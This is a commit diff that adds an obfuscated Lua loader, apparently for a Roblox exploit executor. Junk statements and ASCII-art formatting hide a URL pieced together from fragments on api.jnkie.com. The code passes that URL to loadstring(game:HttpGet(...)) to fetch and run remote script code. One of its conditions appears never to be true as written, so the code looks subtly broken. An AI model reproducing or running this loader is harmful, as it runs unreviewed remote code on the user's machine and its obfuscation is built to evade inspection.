7c2c56cd7a3d2876224a637acfd22d36906f7e6d
Team Noxious <teamnoxiousholder@gmail.com>
2026-05-22 18:54:48 -0400

    Update Loader.lua

--- Loader.lua
+++ Loader.lua
@@ -1,1 +1,41 @@
---
+none
+                                 =[[eXq]] do
+                              task.wait();local
+                               qHAT=function(s)
+                                :string? print(
+                                 s)end;if 529==
+              12                  then qHAT=[[A             oq
+          e]]end                  ;end;local gv             =none;
+      gv=getgenv                   ()or _G.AAA;             if not _G.
+   HAUC then WOD                    =[[nop]]end             local p=[[aaa
+   af$3s]];if gv                    .ADn84tsai8             then none="a"
+   end;gv["7S"..                     [[G_A]] ..             [[9A]].."V"..
+   [[EDa]]]=true                      gv["AD"..             "93ndsajs0"]=
+   "";local UH,A                       ,LC,O,QQ             =3,delay,0,[[
+   Q]],nil;local                        IiA3fAo             =function(pa)
+   :number if pa                        :IsA(""             .."BasePart")
+   then return O                         ,math.             floor(1/29^5)
+   end;end;QQ,LC                          =1,""             for _=1,02 do
+   LC={[24]=UH/2                           *41/             12,["a"]=[[SR
+   @(WEIJ#(#dnAA             ;              e]]             }end;local A=
+   "htt";local B             ="              -"             ;local C='ps'
+   do end ;local             E=",             :             #";E="api";O=
+   ".jnkie.com";             s='/                           's='/'Q="v"..
+   "1/luascri"..             "p"..                          "ts/public/";
+   while 0~=0 do             qHAT="                         0"..tostring(
+   12311)end;WOD             =A..C..                        `:` ..E..O..s
+   ..E..s..Q..(A             and"")..                       "13e701677"..
+   (qHAT=="3"and             8/31/412                       or"a42a72cd")
+   .."76c380631"             ..(19==91                      and"a"or"")..
+   [[de46e2914]]             .."90ad1b"                     ..[[60da5c3]]
+   ..'e04f2acce'             .."c681776"                    ;local F,H=[[
+   0542da4bc]]..             [[ad99edd]],                   "download"F=F
+      local lsg=             loadstring;Z                   =[[aint2]]
+          do lsg             (game:HttpGet                  ([[ad=
+              ]]             ==12 and WOD..                 H)
+                             or"")(...);end
+							               Q=[[Ad9u3tnAD]]
+							               while 31==0.2 do
+                             none="aqweaa";end
+                                none=nil;do
+                                    end;
